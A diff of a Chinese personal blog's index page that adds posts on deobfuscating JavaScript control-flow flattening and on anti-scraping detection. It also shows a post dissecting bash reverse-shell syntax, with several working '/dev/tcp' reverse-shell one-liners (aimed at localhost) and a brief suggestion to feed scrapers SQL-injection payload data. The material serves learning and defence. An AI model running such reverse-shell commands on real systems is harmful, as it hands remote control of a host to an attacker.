@@ -125,12 +125,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-count">61</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -168,7 +168,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -181,7 +181,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
+          <a href="/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/" class="post-title-link" itemprop="url">反混淆"控制流平坦化"</a>
         </h2>
 
         <div class="post-meta-container">
@@ -205,63 +205,169 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
-<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>-i 参数</p>
-<p>  生成交互式shell</p>
-</li>
-<li><p><code>&gt;&amp;</code> 是什么？</p>
-<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>业务逻辑非常依赖前端的安全产品，比如<a target="_blank" rel="noopener" href="https://www.geetest.com/">极验</a>、<a target="_blank" rel="noopener" href="https://www.dingxiang-inc.com/docs/detail/captcha">顶象-无感验证</a>、瑞数 等都会对前端代码做混淆。其中有一种强度较高的混淆方式，叫”控制流平坦化”。</p>
+<blockquote>
+<p>“控制流平坦化”是将一些顺序执行的代码，变化成阅读难度更大的<code>while-switch-case</code>或者<code>for-switch-case</code>代码。可以见<a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">ControlFlow</a>这个项目的例子。</p>
+</blockquote>
+<p>如果能够”反混淆”这种”控制流平坦化”混淆后的代码，就能让代码变得更容易阅读一些。</p>
+<p>本文介绍”反控制流平坦化”的思路和实践过程，最终可以反混淆<code>ControlFlow</code>和<code>https://obfuscator.io/</code>两个工具的”控制流平坦化”。</p>
+<p>反混淆思路：</p>
 <ul>
-<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
+<li>按照”while-switch-case”执行顺序，拼接case语句</li>
+</ul>
+<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><ul>
+<li><p>怎么实现？</p>
+<p>分为两步：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 第一步获取case块的执行顺序</span><br><span class="line">* 第二部根据case块的执行顺序，拼接case块</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
-<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
-<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
+<li><p>怎么获取”case块的执行顺序”？</p>
+<p>思路是在每个case块中”注入代码”，然后在浏览器中执行js代码，执行过程”注入代码”就可以记录执行顺序。我理解这个类似”软件测试”中计算”代码覆盖率”时用到的插桩。</p>
+<p>原始代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while (!![])&#123;</span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>插桩后,代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 利用&quot;插桩&quot;记录while-switch-case执行顺序</span><br><span class="line">&#x2F;&#x2F; 集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">let while_id_stack &#x3D; []  &#x2F;&#x2F; 栈</span><br><span class="line"></span><br><span class="line">let collection &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">while (!![])&#123;</span><br><span class="line">  while_statement_id &#x3D; 111</span><br><span class="line">  while_id_stack.push(while_statement_id)</span><br><span class="line">  collection[while_statement_id] &#x3D; []</span><br><span class="line"></span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      case_statement_id &#x3D; 222</span><br><span class="line">      while_id_on_stack_op &#x3D; while_id_stack[while_id_stack.length-1]</span><br><span class="line">      collection[while_id_on_stack_op].push(case_statement_id)</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while_id_stack.pop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record(collection)</span><br></pre></td></tr></table></figure>
+
+<p>浏览器运行后，集合中就存放有case节点的执行顺序。</p>
+<p>上面都是伪代码，具体实现见 hook.js</p>
+</li>
+<li><p>怎么拼接case块？</p>
+<p>伪代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">函数1：</span><br><span class="line"></span><br><span class="line">  遍历ast，如果遇到while语句 &#123;</span><br><span class="line">    得到当前while id</span><br><span class="line"></span><br><span class="line">    if while id in 集合:</span><br><span class="line">      顺序拼接各个case块内容</span><br><span class="line"></span><br><span class="line">      用&quot;拼接后的顺序语句&quot;替换&quot;while语句&quot;</span><br><span class="line"></span><br><span class="line">      从集合中删除 while id记录</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">while 集合中还有元素:</span><br><span class="line"></span><br><span class="line">  调用 函数1</span><br></pre></td></tr></table></figure>
+
+<p>具体实现见 simple_decode.js</p>
 </li>
 </ul>
-</li>
-<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
-<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
-<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
-<p>  更详细的可以看参考资料</p>
-</li>
-<li><p><code>0&gt;&amp;1</code> 是什么？</p>
-<p>  将标准输入重定向到标准输出</p>
-</li>
-<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
-<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
-</li>
-</ul>
-<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
-<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
-<li><p>验证<code>&gt;&amp;</code>语法</p>
-<p> <code>&amp;&gt;</code>是一种特殊情况</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
-<li><p>验证 文件描述符指向 socket</p>
-<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
+<h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><p>可以将”while-switch-case代码块”变成”顺序执行的代码块”。</p>
+<p>比如 PlayWithObfuscator/tests/encoded_js/simple.js 中的混淆后的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while (!![]) &#123;</span><br><span class="line">    switch (_0xcgcd3c[_0x3922ce++]) &#123;</span><br><span class="line">        case &quot;0&quot;:</span><br><span class="line">            if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        case &quot;1&quot;:</span><br><span class="line">            _0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br><span class="line">            continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
-<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
-<p> 比如下面命令反弹shell会有些问题</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p> 而下面命令可以反弹shell</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
+<p>转换成 阅读性更好一些的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">_0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br></pre></td></tr></table></figure>
 
-</li>
-</ol>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前属于demo阶段，可以对以下工具的”控制流平坦化”做反混淆：</p>
 <ul>
-<li>“&gt;&amp;”的两种用法</li>
-<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
+<li><a target="_blank" rel="noopener" href="https://obfuscator.io/">https://obfuscator.io/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">https://github.com/Tsaiboss/ControlFlow</a></li>
 </ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
+<p>测试结果在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithObfuscator/tree/main/tests">tests目录</a> 看到</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a314131070/article/details/106567825?spm=1001.2014.3001.5501">JS反混淆-控制流平展（一）</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E7%88%AC%E6%A3%80%E6%B5%8B%E5%B0%8F%E7%BB%93(%E4%B8%80)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%8F%8D%E7%88%AC%E6%A3%80%E6%B5%8B%E5%B0%8F%E7%BB%93(%E4%B8%80)/" class="post-title-link" itemprop="url">反爬检测小结(一)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前对”反爬反bot”做过一些调研工作：从网上搜索资料、研究分析厂商的产品。</p>
+<p>如果你也准备做”反爬”相关的工作，希望我的小结能够加速你的进度。</p>
+<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><ul>
+<li><p>是什么？</p>
+<p>在做”反爬”之前，我想有必要对我们的目标”爬虫”有一些了解。下面的分类有些只是我个人的分法，相信”老反爬工程师”有更细致的分类。</p>
+<p>按照产品形态上，爬虫可以分为：</p>
+<blockquote>
+<p>h5爬虫（包括pc端爬虫）：主要爬取网页上的信息，比如淘宝首页的商品信息等</p>
+<p>app爬虫：主要爬取手机app上的信息；有一些基于<a target="_blank" rel="noopener" href="https://developer.android.com/studio/test/monkeyrunner">monkeyrunner</a>实现</p>
+</blockquote>
+<p>提供”反爬服务”的厂商也是根据h5和app提供了不同的解决方案。</p>
+<p>按照好坏，爬虫也可以分为：</p>
+<blockquote>
+<p>合法爬虫：百度、谷歌等爬虫就不能被”反爬产品”拦截，否则会影响客户站点的SEO</p>
+<p>恶意爬虫: 我们要防的</p>
+</blockquote>
+<p>按照爬虫的目的，可以粗略分为：</p>
+<blockquote>
+<p>扫描器爬虫：主要爬取api接口、文件资源等信息，作为”漏洞扫描器”的输入。比如 <a target="_blank" rel="noopener" href="https://github.com/Qianlitp/crawlergo">crawlergo</a></p>
+<p>数据爬虫：主要以爬取数据为目的，可能大部分爬虫都可以归属到这类。</p>
+</blockquote>
+<p>扫描器爬虫有一个特点是，它会做的很”通用”：我比较难想象攻击者会为了测试每一个站点，单独写一个特定的爬虫。因为”通用”，所以这种爬虫我觉得是属于比较好发现和防御的。</p>
+<p>相对来说，数据爬虫就会很”专用”：”爬虫工程师”有足够的耐心去盯着一个目标，和”反爬系统”做对抗。所以这里的对抗程度”最为激烈”（人和人的对抗）。</p>
+<p>因为我只研究了h5爬虫，所以我下面都是围绕h5爬虫的场景来描述。</p>
+</li>
+<li><p>怎么实现h5爬虫？</p>
+<p>想要”反爬”，我们先要知道爬虫是怎么做的。</p>
+<p>从<a target="_blank" rel="noopener" href="https://pitechan.com/%E7%88%AC%E8%99%AB%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E4%B9%8B%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/">网络上</a>找了一个架构图</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/146482122-ac152bed-390e-4e02-ab72-51f5ad437af4.png" alt="爬虫架构"></p>
+<p>这里可以看到架构中包含”代理ip”、”浏览器操作”、”验证码识别”等功能，这些功能也是”反爬系统”重点关注的场景。</p>
+<p>另外根据网上资料总结，爬虫”请求网站数据”有三种比较流行的实现方式：</p>
+<blockquote>
+<p>纯脚本：很多网络上的教程会教你用python语言，beautifulsoup、evaljs等库去实现一个网页爬虫；或者基于scrapy框架来实现</p>
+<p>调用”浏览器”：使用puppeteer、selenium等</p>
+<p>浏览器插件</p>
+</blockquote>
+<p>了解爬虫是怎么实现后，我们就可以来看看怎么”反恶意爬虫”。</p>
+</li>
+<li><p>怎么”反恶意爬虫”？</p>
+<p>我们可以通过下面的方式识别”反恶意爬虫”：</p>
+<blockquote>
+<p>通过”可信前端”来识别爬虫：在”爬虫”调用”浏览器”来”请求网站数据”时，我们通过一些”手段”能够知道浏览器是爬虫在使用，而不是正常用户使用</p>
+<p>人机识别： 爬虫、扫描器、机器人等行为都可以通过”人机识别”来区分</p>
+<p>威胁情报：比如威胁情报能够告诉我们某个ip是否是代理ip，而从上面的架构图来看，”爬虫”是会有”代理ip”模块的</p>
+<p>数据风控：反爬本身就是业务安全，感觉和”风控反欺诈”用到的手段很相似。我没有做过风控，之前在微信读书看过《风控要略:互联网业务反欺诈之路》，感觉写得比较实在，推荐给你。</p>
+</blockquote>
+<p>我们识别”恶意爬虫”最终也是为了保护数据，而”保护数据”并不一定是需要识别”恶意爬虫”。比如 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37838586">字体反爬</a></p>
+<p>甚至可以做一些”反制”，比如<a target="_blank" rel="noopener" href="https://www.cnblogs.com/index-html/p/frontend-based-war.html">对抗假人 —— 前后端结合的 WAF</a>提到通过”脱壳迷惑”、”蜜罐钓鱼”等来消耗”爬虫工程师”的时间资源，再比如爬虫数据最终都要存储，或许可以制造垃圾数据或者带sql注入payload的数据。</p>
+</li>
 </ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文粗略地对”爬虫”和”反爬”手段做了一些分类。后面文章我会讲述”反爬”手段的一些细节和案例。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/146490073-049890c8-b45d-42d4-a337-00ac10251822.png" alt="数据流"></p>
+<p>另外我在调研中觉得有些资料还不错，放到了<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/5aad51fff569308748370dcf1609bc1c">gist</a>，你也可以看看。</p>
 
       
     </div>
@@ -429,6 +535,257 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
+<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>-i 参数</p>
+<p>  生成交互式shell</p>
+</li>
+<li><p><code>&gt;&amp;</code> 是什么？</p>
+<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
+<ul>
+<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
+</li>
+<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
+<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
+<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
+</li>
+</ul>
+</li>
+<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
+<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
+<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
+<p>  更详细的可以看参考资料</p>
+</li>
+<li><p><code>0&gt;&amp;1</code> 是什么？</p>
+<p>  将标准输入重定向到标准输出</p>
+</li>
+<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
+<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
+</li>
+</ul>
+<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
+<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
+<li><p>验证<code>&gt;&amp;</code>语法</p>
+<p> <code>&amp;&gt;</code>是一种特殊情况</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
+<li><p>验证 文件描述符指向 socket</p>
+<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
+
+<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
+<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
+<p> 比如下面命令反弹shell会有些问题</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p> 而下面命令可以反弹shell</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
+
